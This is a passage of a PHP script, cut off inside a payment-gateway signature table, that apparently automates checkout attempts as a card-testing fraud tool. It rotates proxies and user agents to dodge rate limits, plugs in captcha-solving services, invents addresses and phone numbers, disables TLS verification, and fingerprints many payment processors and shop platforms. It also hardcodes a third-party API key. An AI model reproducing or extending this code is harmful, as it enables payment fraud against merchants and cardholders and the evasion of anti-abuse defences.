<?php
error_reporting(E_ALL & ~E_DEPRECATED);
// Extend script execution limit to avoid premature fatal timeouts during network calls
@set_time_limit(300);

// Environment sanity check: require cURL extension
if (!extension_loaded('curl')) {
    header('Content-Type: application/json');
    echo json_encode([
        'error' => 'PHP cURL extension is not enabled',
        'fix' => 'Start the server via START_SERVER.bat (uses PHP with cURL) or enable extension=curl in your php.ini, then restart the server.',
        'php_version' => PHP_VERSION,
    ]);
    exit;
}

$maxRetries = 2; // Optimized: 2 retries max for speed + reliability balance
$retryCount = 0;
$start_time = microtime(true);

// HYPER-FAST MODE: Enable maximum speed optimizations
define('ULTRA_FAST_MODE', true); // Legacy compatibility
define('HYPER_FAST_MODE', true); // New hyper-fast optimizations

require_once 'ho.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

// Proxy rotation setup: use ProxyManager to rotate proxy each request when available
require_once 'ProxyManager.php';
require_once 'AutoProxyFetcher.php';
require_once 'CaptchaSolver.php';
require_once 'AdvancedCaptchaSolver.php';
require_once 'TwoCaptchaSolver.php';
require_once 'ProxyAnalytics.php';
require_once 'TelegramNotifier.php';

if (!function_exists('request_string')) {
    /**
     * Fetch a scalar string from $_GET with minimal normalization.
     */
    function request_string(string $key): string {
        if (!isset($_GET[$key])) {
            return '';
        }
        $value = $_GET[$key];
        if (is_array($value)) {
            $value = reset($value);
        }
        return trim((string)$value);
    }
}

if (!function_exists('parse_bool_flag')) {
    /**
     * Normalize client-provided flag values (query/env) into booleans.
     */
    function parse_bool_flag($value, bool $default = false): bool {
        if ($value === null) {
            return $default;
        }
        $value = strtolower(trim((string)$value));
        if ($value === '') {
            return $default;
        }
        $truthy = ['1', 'true', 'yes', 'on', 'enable', 'enabled'];
        $falsy  = ['0', 'false', 'no', 'off', 'disable', 'disabled'];
        if (in_array($value, $truthy, true)) {
            return true;
        }
        if (in_array($value, $falsy, true)) {
            return false;
        }
        return $default;
    }
}

if (!function_exists('generate_session_token')) {
    /**
     * Generate a short hexadecimal token, tolerant of environments lacking random_bytes().
     */
    function generate_session_token(int $bytes = 4): string {
        if ($bytes < 1) {
            $bytes = 1;
        }
        if (function_exists('random_bytes')) {
            try {
                return substr(bin2hex(random_bytes($bytes)), 0, $bytes * 2);
            } catch (Throwable $e) {
                // fall through to alternate strategies
            }
        }
        if (function_exists('openssl_random_pseudo_bytes')) {
            $strong = false;
            $token = openssl_random_pseudo_bytes($bytes, $strong);
            if ($token !== false && !empty($token)) {
                return substr(bin2hex($token), 0, $bytes * 2);
            }
        }
        $chars = '0123456789abcdef';
        $hex = '';
        for ($i = 0; $i < $bytes * 2; $i++) {
            $hex .= $chars[mt_rand(0, 15)];
        }
        return $hex;
    }
}

// Initialize advanced systems
$analytics = new ProxyAnalytics();
$telegram = new TelegramNotifier();
$advancedCaptchaSolver = new AdvancedCaptchaSolver(isset($_GET['debug']));

// Initialize 2Captcha solver with API key (fallback for complex captchas)
$twoCaptchaApiKey = getenv('TWOCAPTCHA_API_KEY') ?: 'a9c730ba8bc503517961db5a94892775';
if (isset($_GET['captcha_key'])) {
    $twoCaptchaApiKey = trim($_GET['captcha_key']);
}
$twoCaptchaSolver = new TwoCaptchaSolver($twoCaptchaApiKey, isset($_GET['debug']));

// Auto-fetch proxies DISABLED BY DEFAULT for maximum speed
// User should provide proxy via ?proxy= parameter or manually populate ProxyList.txt
$autoFetchEnabled = false;
if (isset($_GET['autofetch']) && $_GET['autofetch'] === '1') {
    $autoFetchEnabled = true;
    $autoFetcher = new AutoProxyFetcher([
        'debug' => isset($_GET['debug']),
        'minProxies' => 5,
        'fetchTimeout' => 15,
    ]);
    if ($autoFetcher->needsFetch()) {
        $fetchResult = $autoFetcher->ensureProxies();
        if (!empty($fetchResult['success']) && isset($_GET['debug'])) {
            error_log("[AutoFetch] Fetched {$fetchResult['count']} proxies");
        }
    }
}

$__pm = new ProxyManager();
$__pm_count = file_exists('ProxyList.txt') ? $__pm->loadFromFile('ProxyList.txt') : 0;

// Configure rate limiting (enabled by default)
$__pm->setRateLimitDetection(true);
$__pm->setAutoRotateOnRateLimit(true);

// Allow runtime configuration via GET parameters
if (isset($_GET['rate_limit_detection'])) {
    $__pm->setRateLimitDetection($_GET['rate_limit_detection'] === '1' || $_GET['rate_limit_detection'] === 'true');
}
if (isset($_GET['auto_rotate_rate_limit'])) {
    $__pm->setAutoRotateOnRateLimit($_GET['auto_rotate_rate_limit'] === '1' || $_GET['auto_rotate_rate_limit'] === 'true');
}
if (isset($_GET['rate_limit_cooldown']) && is_numeric($_GET['rate_limit_cooldown'])) {
    $__pm->setRateLimitCooldown((int)$_GET['rate_limit_cooldown']);
}
if (isset($_GET['max_rate_limit_retries']) && is_numeric($_GET['max_rate_limit_retries'])) {
    $__pm->setMaxRateLimitRetries((int)$_GET['max_rate_limit_retries']);
}

if (isset($_GET['debug'])) {
    error_log("[DEBUG] Loaded $__pm_count proxies from ProxyList.txt");
    error_log("[DEBUG] Rate limiting detection: enabled");
    error_log("[DEBUG] Auto-rotate on rate limit: enabled");
}

// Initialize captcha solver (use advanced solver)
$captchaSolver = $advancedCaptchaSolver;

// Default: AUTO-ROTATE proxy per request (enabled by default)
// Supports all proxy types: HTTP, HTTPS, SOCKS4/5, Residential, Rotating, Datacenter, Mobile, ISP
$ROTATE_PROXY_PER_REQUEST = true;

// Optional runtime override: rotate=0 to disable (specific ?proxy= also disables)
if (isset($_GET['rotate'])) {
    $rot = trim((string)$_GET['rotate']);
    if ($rot === '0' || $rot === 'false') {
        $ROTATE_PROXY_PER_REQUEST = false;
    }
}

// If specific proxy is provided, disable auto-rotation
if (!empty($_GET['proxy'])) {
    $ROTATE_PROXY_PER_REQUEST = false;
}

// User-Agent rotation control (default: do NOT rotate per request step)
$ROTATE_UA_PER_STEP = false;
if (isset($_GET['rotate_ua'])) {
    $rua = strtolower((string)$_GET['rotate_ua']);
    if ($rua === '0' || $rua === 'false') $ROTATE_UA_PER_STEP = false;
    if ($rua === '1' || $rua === 'true') $ROTATE_UA_PER_STEP = true;
}

// Per-request stable User-Agent for the entire flow
if (!function_exists('flow_user_agent')) {
    function flow_user_agent(): string {
        // When rotating UA per step, generate a fresh UA for each call
        if (isset($GLOBALS['ROTATE_UA_PER_STEP']) && $GLOBALS['ROTATE_UA_PER_STEP'] === true) {
            $uaGen = new userAgent();
            return $uaGen->generate('windows');
        }
        // Otherwise, keep one stable UA for the whole request flow
        if (!isset($GLOBALS['__flow_ua'])) {
            $uaGen = new userAgent();
            $GLOBALS['__flow_ua'] = $uaGen->generate('windows');
        }
        return $GLOBALS['__flow_ua'];
    }
}

// Parse proxy string into components, supporting user:pass@host:port and socks5h/socks4a
function parse_proxy_components(string $proxyStr): array {
    $raw = trim($proxyStr);
    $type = 'http';
    $rest = $raw;
    // Extract scheme if present
    if (preg_match('/^(https?|socks5h?|socks4a?|socks[45]):\/\/(.+)$/i', $raw, $m)) {
        $type = strtolower($m[1]);
        $rest = $m[2];
    }
    
    $user = '';
    $pass = '';
    $host = '';
    $port = '';
    
    // Format 1: user:pass@host:port
    if (strpos($rest, '@') !== false) {
        list($auth, $hostport) = explode('@', $rest, 2);
        if (strpos($auth, ':') !== false) {
            list($user, $pass) = explode(':', $auth, 2);
        } else {
            $user = $auth;
        }
        // Split host:port
        if (strpos($hostport, ':') !== false) {
            list($host, $port) = explode(':', $hostport, 2);
        } else {
            $host = $hostport;
        }
    }
    // Format 2: ip:port:user:pass (colon-separated with exactly 4 parts)
    else {
        $parts = explode(':', $rest);
        if (count($parts) === 4) {
            // Validate that second part is numeric (port)
            if (is_numeric($parts[1])) {
                $host = $parts[0];
                $port = $parts[1];
                $user = $parts[2];
                $pass = $parts[3];
            }
        }
        // Format 3: host:port (no credentials)
        elseif (count($parts) === 2) {
            $host = $parts[0];
            $port = $parts[1];
        }
    }
    
    return [
        'type' => $type,
        'host' => $host,
        'port' => $port,
        'user' => $user,
        'pass' => $pass,
    ];
}

// Transform username for rotating/residential proxies: placeholders and session
function transform_rotating_username(string $user): string {
    $u = $user;
    $rotate = false;
    if (isset($_GET['rotateSession'])) {
        $v = strtolower((string)$_GET['rotateSession']);
        $rotate = ($v === '1' || $v === 'true' || $v === 'yes');
    }
    $country = isset($_GET['country']) ? strtolower(trim((string)$_GET['country'])) : '';
    // session token
    $sess = generate_session_token(4);
    if (strpos($u, '{session}') !== false) {
        $u = str_replace('{session}', $sess, $u);
    } elseif ($rotate && $u !== '' && strpos($u, 'session-') === false) {
        $u .= '-session-' . $sess;
    }
    if ($country !== '') {
        $u = str_replace('{country}', $country, $u);
    }
    return $u;
}

// Extract target site early so proxy testing can validate against it when available
$__requested_site_param = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$__requested_site_for_test = null;
if (!empty($__requested_site_param)) {
    $host = parse_url($__requested_site_param, PHP_URL_HOST);
    if (!empty($host)) {
        $__requested_site_for_test = 'https://' . $host;
    }
}

// Load random address with error handling
if (!file_exists('add.php')) {
    error_log('[ERROR] add.php not found - using fallback address');
    $randomAddress = [
        'numd' => '123',
        'address1' => 'Main Street',
        'city' => 'New York',
        'state' => 'NY',
        'zip' => '10001'
    ];
} else {
    require_once 'add.php';
    if (!isset($randomAddress) || !is_array($randomAddress)) {
        error_log('[ERROR] $randomAddress not properly initialized in add.php');
        $randomAddress = [
            'numd' => '123',
            'address1' => 'Main Street',
            'city' => 'New York',
            'state' => 'NY',
            'zip' => '10001'
        ];
    }
}
$num_us = $randomAddress['numd'] ?? '123';
$address_us = $randomAddress['address1'] ?? 'Main Street';
$address = $num_us.' '.$address_us;
$city_us = $randomAddress['city'] ?? 'New York';
$state_us = $randomAddress['state'] ?? 'NY';
$zip_us = $randomAddress['zip'] ?? '10001';

$inputStreetAddress = request_string('street_address');
$inputStreetAddress2 = request_string('street_address2');
$inputCity = request_string('city');
$inputState = strtoupper(request_string('state'));
$inputPostal = request_string('postal_code');
$inputCountry = strtoupper(request_string('country'));
$inputFirstName = request_string('first_name');
$inputLastName = request_string('last_name');
$inputEmail = request_string('email');
$inputCardholder = request_string('cardholder_name');
if ($inputCardholder === '' && $inputFirstName !== '' && $inputLastName !== '') {
    $inputCardholder = trim($inputFirstName . ' ' . $inputLastName);
}
$firstname = $inputFirstName;
$lastname = $inputLastName;
$email = $inputEmail;
$cardholder_name = $inputCardholder;
if ($inputCountry === '') {
    $inputCountry = 'US';
}
$customAddressProvided = ($inputStreetAddress !== '' && $inputCity !== '' && $inputState !== '' && $inputPostal !== '');
if ($customAddressProvided) {
    if (preg_match('/^\s*([0-9]+)\s+(.*)$/', $inputStreetAddress, $matches)) {
        $num_us = $matches[1];
        $address_us = $matches[2];
    } else {
        $num_us = '';
        $address_us = $inputStreetAddress;
    }
    // Append second line if supplied
    if ($inputStreetAddress2 !== '') {
        $address_us = trim($address_us . ' ' . $inputStreetAddress2);
    }
    $address = trim($inputStreetAddress . ($inputStreetAddress2 !== '' ? ' ' . $inputStreetAddress2 : ''));
    $city_us = $inputCity;
    $state_us = $inputState;
    $zip_us = $inputPostal;
}
$country_code = $inputCountry;

require_once 'no.php';
$inputPhone = request_string('phone');
if ($inputPhone !== '') {
    $phone = $inputPhone;
} else {
    $areaCode = $areaCodes[array_rand($areaCodes)];
    $phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));
}

// Important functions start
// Lightweight embedded utilities: CaptchaSolver and GatewayDetector
// Pull runtime config from query (optional): cto, to, sleep, v4
function runtime_cfg(): array {
    static $cache = null;
    if ($cache !== null) {
        return $cache;
    }
    // HYPER-FAST: Optimized for maximum speed and performance
    // Connect timeout: 2s (faster connection establishment)
    // Total timeout: 8s (optimized for fast checkout flows)
    $cto = isset($_GET['cto']) ? max(1, (int)$_GET['cto']) : 2;   // connect timeout: 2s (reduced from 3s)
    $to  = isset($_GET['to'])  ? max(5, (int)$_GET['to'])  : 8;   // total timeout: 8s (reduced from 10s)
    // Sleep between phases reduced to 0.05s for maximum speed
    // Increase if you experience payment processor timeouts: ?sleep=0.2
    $slp = isset($_GET['sleep']) ? max(0, (float)$_GET['sleep']) : 0.05; // sleep seconds between phases (reduced from 0.1s)
    $v4  = isset($_GET['v4']) ? (bool)$_GET['v4'] : true; // prefer IPv4
    $fastFail = isset($_GET['fast_fail']) ? (bool)$_GET['fast_fail'] : true;
    $quickAbort = isset($_GET['quick_abort']) ? (bool)$_GET['quick_abort'] : true;
    $maxStrategies = isset($_GET['max_strategies']) ? max(1, (int)$_GET['max_strategies']) : 2;
    $cache = ['cto'=>$cto,'to'=>$to,'sleep'=>$slp,'v4'=>$v4,'fast_fail'=>$fastFail,'quick_abort'=>$quickAbort,'max_strategies'=>$maxStrategies];
    return $cache;
}

// Apply common timeouts and perf flags to a curl handle
function apply_common_timeouts($ch): void {
    $cfg = runtime_cfg();
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $cfg['cto']);
    curl_setopt($ch, CURLOPT_TIMEOUT, $cfg['to']);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 180); // Increased to 3 minutes for better caching
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, false);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, false);
    // Enable HTTP/2 if available for better performance
    if (defined('CURL_HTTP_VERSION_2_0')) {
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    }
    // Relax SSL verification to avoid self-signed chain issues when proxied
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if ($cfg['v4'] && defined('CURL_IPRESOLVE_V4')) {
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    }
}
if (!class_exists('CaptchaSolver')) {
class CaptchaSolver {
    // Use the per-request stable UA
    private static function rotatingUA(): string { return flow_user_agent(); }
    public static function detectCaptcha(string $html): array {
        $h = strtolower($html);
        $res = [];
        if (strpos($h, 'hcaptcha') !== false || strpos($h, 'h-captcha') !== false) {
            preg_match('/data-sitekey=["\']([^"\']+)["\']/', $html, $m);
            $res['hcaptcha'] = ['type' => 'hcaptcha', 'sitekey' => $m[1] ?? null];
        }
        if (strpos($h, 'recaptcha') !== false || strpos($h, 'google.com/recaptcha') !== false) {
            preg_match('/data-sitekey=["\']([^"\']+)["\']/', $html, $m);
            $res['recaptcha_v2'] = ['type' => 'recaptcha_v2', 'sitekey' => $m[1] ?? null];
        }
        if (strpos($html, 'grecaptcha.execute') !== false) {
            preg_match('/grecaptcha\.execute\(["\']([^"\']+)["\']/', $html, $m);
            $res['recaptcha_v3'] = ['type' => 'recaptcha_v3', 'sitekey' => $m[1] ?? null];
        }
        return $res;
    }
    public static function requiresCaptcha(string $html): bool {
        $h = strtolower($html);
        return (strpos($h, 'hcaptcha') !== false || strpos($h, 'recaptcha') !== false || strpos($h, 'captcha') !== false);
    }
    public static function tryHeaderSkip(string $url, ?string $cookieFile = null): array {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'User-Agent: '.self::rotatingUA(),
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
            'Connection: keep-alive'
        ]);
        if ($cookieFile) {
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
        }
        // Reuse current proxy if any
        if (function_exists('apply_proxy_if_used')) {
            apply_proxy_if_used($ch, $url);
        }
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['success' => ($code == 200), 'response' => $resp, 'http_code' => $code];
    }
}
}

if (!class_exists('GatewayDetector')) {
class GatewayDetector {
    private const SIGNATURES = [
        'stripe' => [
            'name' => 'Stripe',
            'keywords' => ['stripe', 'pk_live_', 'stripe.js', 'stripepayment', 'stripe-element', 'stripeToken', 'stripe-checkout'],
            'url_keywords' => ['stripe.com', 'stripe.network', 'checkout.stripe.com'],
            'aliases' => ['stripe', 'stripe payments', 'stripe checkout'],
            'card_networks' => ['visa','mastercard','amex','discover','jcb','diners'],
            'supports_cards' => true,
            'three_ds' => 'adaptive',
            'features' => ['3ds2','apple_pay','google_pay','link'],
            'funding_types' => ['cards','wallets'],
        ],
        'paypal' => [
            'name' => 'PayPal / Braintree',
            'keywords' => ['paypal', 'braintree', 'client-id', 'smart-payment-buttons', 'paypalcommerce'],
            'url_keywords' => ['paypal.com', 'paypalobjects.com', 'braintreepayments.com'],
            'aliases' => ['paypal', 'paypal checkout', 'braintree'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['paypal_balance','smart_buttons','vault'],
            'funding_types' => ['cards','wallets','bank'],
        ],
        'razorpay' => [
            'name' => 'Razorpay',
            'keywords' => ['razorpay', 'rzp_', 'checkout.razorpay', 'razorpay_order_id'],
            'url_keywords' => ['razorpay.com'],
            'aliases' => ['razorpay'],
            'card_networks' => ['visa','mastercard','amex','rupay'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['upi','emi','netbanking'],
            'funding_types' => ['cards','upi','netbanking'],
        ],
        'authorize_net' => [
            'name' => 'Authorize.Net',
            'keywords' => ['authorize.net', 'authorizenet', 'accept.js', 'anet_'],
            'url_keywords' => ['authorize.net'],
            'aliases' => ['authorize.net', 'authnet'],
            'card_networks' => ['visa','mastercard','amex','discover','diners'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['avs','card_present','recurring'],
            'funding_types' => ['cards'],
        ],
        'shopify_payments' => [
            'name' => 'Shopify Payments',
            'keywords' => ['shopify payments', 'shopifypayments', 'shopify_pay', 'shopify-billing'],
            'url_keywords' => ['pay.shopify.com', 'shopifycloud.com'],
            'aliases' => ['shopify payments', 'shopify pay'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'adaptive',
            'features' => ['shop_pay','apple_pay','google_pay'],
            'funding_types' => ['cards','wallets'],
        ],
        'payu' => [
            'name' => 'PayU',
            'keywords' => ['payu', 'payubiz', 'secure.payu', 'boltpay'],
            'url_keywords' => ['payu.in', 'payu.lat', 'secure.payu'],
            'aliases' => ['payu', 'payubiz'],
            'card_networks' => ['visa','mastercard','amex','diners'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['emi','upi','netbanking'],
            'funding_types' => ['cards','upi','netbanking'],
        ],
        'adyen' => [
            'name' => 'Adyen',
            'keywords' => ['adyen', 'adyencheckout', 'adyenEncrypted'],
            'url_keywords' => ['adyen.com'],
            'aliases' => ['adyen'],
            'card_networks' => ['visa','mastercard','amex','discover','jcb','diners'],
            'supports_cards' => true,
            'three_ds' => '3ds2',
            'features' => ['3ds2','local_methods','risk'],
            'funding_types' => ['cards','wallets','local'],
        ],
        'checkout_com' => [
            'name' => 'Checkout.com',
            'keywords' => ['checkout.com', 'cko', 'cko-public-key', 'checkoutjs'],
            'url_keywords' => ['checkout.com'],
            'aliases' => ['checkout', 'cko'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => '3ds2',
            'features' => ['3ds2','instrument_token','apple_pay'],
            'funding_types' => ['cards','wallets'],
        ],
        'worldpay' => [
            'name' => 'Worldpay',
            'keywords' => ['worldpay', 'worldpayonline'],
            'url_keywords' => ['worldpay.com'],
            'aliases' => ['worldpay'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['3ds','risk'],
            'funding_types' => ['cards'],
        ],
        'sagepay' => [
            'name' => 'SagePay / Opayo',
            'keywords' => ['sagepay', 'opayo'],
            'url_keywords' => ['sagepay.co.uk', 'opayo.co.uk'],
            'aliases' => ['sagepay', 'opayo'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['avs','3ds'],
            'funding_types' => ['cards'],
        ],
        'paytm' => [
            'name' => 'Paytm',
            'keywords' => ['paytm', 'securegw-stage.paytm'],
            'url_keywords' => ['paytm.com'],
            'aliases' => ['paytm'],
            'card_networks' => ['visa','mastercard','amex','rupay'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['upi','wallet','netbanking'],
            'funding_types' => ['cards','upi','wallet'],
        ],
        'phonepe' => [
            'name' => 'PhonePe',
            'keywords' => ['phonepe', 'phonepe-checkout'],
            'url_keywords' => ['phonepe.com'],
            'aliases' => ['phonepe'],
            'card_networks' => ['visa','mastercard','rupay'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['upi','wallet'],
            'funding_types' => ['upi','wallet','cards'],
        ],
        'square' => [
            'name' => 'Square',
            'keywords' => ['square', 'squareup', 'sq0idp', 'square-payment-form'],
            'url_keywords' => ['squareup.com'],
            'aliases' => ['square', 'squareup'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['card_on_file','pos','giftcard'],
            'funding_types' => ['cards','pos'],
        ],
        'klarna' => [
            'name' => 'Klarna',
            'keywords' => ['klarna', 'klarna-payments'],
            'url_keywords' => ['klarna.com'],
            'aliases' => ['klarna'],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'n/a',
            'features' => ['bnpl','installments'],
            'funding_types' => ['bnpl'],
        ],
        'afterpay' => [
            'name' => 'Afterpay / Clearpay',
            'keywords' => ['afterpay', 'clearpay'],
            'url_keywords' => ['afterpay.com', 'clearpay.co.uk'],
            'aliases' => ['afterpay', 'clearpay'],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'n/a',
            'features' => ['bnpl'],
            'funding_types' => ['bnpl'],
        ],
        'affirm' => [
            'name' => 'Affirm',
            'keywords' => ['affirm', 'affirm-checkout'],
            'url_keywords' => ['affirm.com'],
            'aliases' => ['affirm'],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'n/a',
            'features' => ['bnpl'],
            'funding_types' => ['bnpl'],
        ],
        'cybersource' => [
            'name' => 'Cybersource',
            'keywords' => ['cybersource', 'flex-microform', 'ics_'],
            'url_keywords' => ['cybersource.com'],
            'aliases' => ['cybersource'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => '3ds2',
            'features' => ['tokenization','risk'],
            'funding_types' => ['cards'],
        ],
        'mercadopago' => [
            'name' => 'Mercado Pago',
            'keywords' => ['mercadopago', 'mp_checkout', 'mercado_pago'],
            'url_keywords' => ['mercadopago.com'],
            'aliases' => ['mercadopago'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['boleto','pix','wallet'],
            'funding_types' => ['cards','wallet','bank'],
        ],
        'amazon_pay' => [
            'name' => 'Amazon Pay',
            'keywords' => ['amazonpay', 'amazon pay', 'offamazonpaymentsservice'],
            'url_keywords' => ['amazonpay.com', 'payments.amazon.com'],
            'aliases' => ['amazon pay'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['amazon_wallet','recurring'],
            'funding_types' => ['cards','wallet'],
        ],
        'skrill' => [
            'name' => 'Skrill',
            'keywords' => ['skrill', 'moneybookers'],
            'url_keywords' => ['skrill.com'],
            'aliases' => ['skrill', 'moneybookers'],
            'card_networks' => ['visa','mastercard'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['wallet','crypto'],
            'funding_types' => ['wallet','cards'],
        ],
        'alipay' => [
            'name' => 'Alipay',
            'keywords' => ['alipay', 'alipayobject'],
            'url_keywords' => ['alipay.com'],
            'aliases' => ['alipay'],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'n/a',
            'features' => ['qrpay','wallet'],
            'funding_types' => ['wallet'],
        ],
        'wepay' => [
            'name' => 'WePay',
            'keywords' => ['wepay', 'gopay', 'wpengine-pay'],
            'url_keywords' => ['wepay.com'],
            'aliases' => ['wepay'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['platform_payments','crowdfunding'],
            'funding_types' => ['cards','ach'],
        ],
        'global_payments' => [
            'name' => 'Global Payments / TSYS',
            'keywords' => ['globalpayments', 'tsys', 'heartlandpay'],
            'url_keywords' => ['globalpaymentsinc.com'],
            'aliases' => ['global payments', 'tsys', 'heartland'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['tokenization','pos'],
            'funding_types' => ['cards','pos'],
        ],
        'paystack' => [
            'name' => 'Paystack',
            'keywords' => ['paystack', 'psck_', 'paystack-inline'],
            'url_keywords' => ['paystack.com'],
            'aliases' => ['paystack'],
            'card_networks' => ['visa','mastercard','verve'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['bank_transfer','ussd'],
            'funding_types' => ['cards','bank'],
        ],
        'iyzipay' => [
            'name' => 'Iyzipay',
            'keywords' => ['iyzipay', 'iyzico'],
            'url_keywords' => ['iyzipay.com'],
            'aliases' => ['iyzipay', 'iyzico'],
            'card_networks' => ['visa','mastercard'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['installments'],
            'funding_types' => ['cards'],
        ],
        'mollie' => [
            'name' => 'Mollie',
            'keywords' => ['mollie', 'mollie-payments', 'profile_id'],
            'url_keywords' => ['mollie.com'],
            'aliases' => ['mollie'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => '3ds2',
            'features' => ['ideal','bancontact'],
            'funding_types' => ['cards','local'],
        ],
        'woocommerce' => [
            'name' => 'WooCommerce',
            'keywords' => ['woocommerce', 'wc-ajax', 'wc_checkout', 'woocommerce-checkout', 'wc-gateway', 'woocommerce-order'],
            'url_keywords' => ['woocommerce', 'wp-content/plugins/woocommerce', 'wc-api'],
            'aliases' => ['woocommerce', 'wc'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'varies_by_gateway',
            'features' => ['wordpress','multiple_gateways','subscriptions','bookings'],
            'funding_types' => ['cards','wallets','local'],
        ],
        'shopify' => [
            'name' => 'Shopify',
            'keywords' => ['shopify', 'myshopify.com', 'shopify-checkout', 'shopify-express', 'checkout.liquid'],
            'url_keywords' => ['myshopify.com', 'shopify.com', 'shopifycdn.com'],
            'aliases' => ['shopify', 'shopify store'],
            'card_networks' => ['visa','mastercard','amex','discover','jcb'],
            'supports_cards' => true,
            'three_ds' => 'adaptive',
            'features' => ['shop_pay','multi_currency','subscriptions'],
            'funding_types' => ['cards','wallets'],
        ],
        'magento' => [
            'name' => 'Magento / Adobe Commerce',
            'keywords' => ['magento', 'mage', 'magento-checkout', 'magento_', 'adobecommerce'],
            'url_keywords' => ['magento', 'adobecommerce'],
            'aliases' => ['magento', 'adobe commerce'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'varies_by_gateway',
            'features' => ['multi_store','b2b','enterprise'],
            'funding_types' => ['cards','wallets','local'],
        ],
        'bigcommerce' => [
            'name' => 'BigCommerce',
            'keywords' => ['bigcommerce', 'bc-checkout', 'bigcommerce-store'],
            'url_keywords' => ['bigcommerce.com', 'mybigcommerce.com'],
            'aliases' => ['bigcommerce', 'big commerce'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'adaptive',
            'features' => ['multi_channel','b2b','headless'],
            'funding_types' => ['cards','wallets'],
        ],
        'prestashop' => [
            'name' => 'PrestaShop',
            'keywords' => ['prestashop', 'ps_checkout', 'presta-shop'],
            'url_keywords' => ['prestashop'],
            'aliases' => ['prestashop'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'varies_by_gateway',
            'features' => ['multi_language','dropshipping'],
            'funding_types' => ['cards','local'],
        ],
        'opencart' => [
            'name' => 'OpenCart',
            'keywords' => ['opencart', 'oc-checkout', 'opencart-payment'],
            'url_keywords' => ['opencart'],
            'aliases' => ['opencart'],
            'card_networks' => ['visa','mastercard','amex'],
            'supports_cards' => true,
            'three_ds' => 'varies_by_gateway',
            'features' => ['open_source','extensions'],
            'funding_types' => ['cards'],
        ],
        'coinbase_commerce' => [
            'name' => 'Coinbase Commerce',
            'keywords' => ['coinbase', 'coinbase-commerce', 'coinbase-checkout'],
            'url_keywords' => ['commerce.coinbase.com'],
            'aliases' => ['coinbase', 'coinbase commerce'],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'n/a',
            'features' => ['crypto','bitcoin','ethereum'],
            'funding_types' => ['crypto'],
        ],
        'bitpay' => [
            'name' => 'BitPay',
            'keywords' => ['bitpay', 'bitpay-checkout', 'bitcoin-payment'],
            'url_keywords' => ['bitpay.com'],
            'aliases' => ['bitpay'],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'n/a',
            'features' => ['crypto','bitcoin'],
            'funding_types' => ['crypto'],
        ],
        'payoneer' => [
            'name' => 'Payoneer',
            'keywords' => ['payoneer', 'payoneer-checkout'],
            'url_keywords' => ['payoneer.com'],
            'aliases' => ['payoneer'],
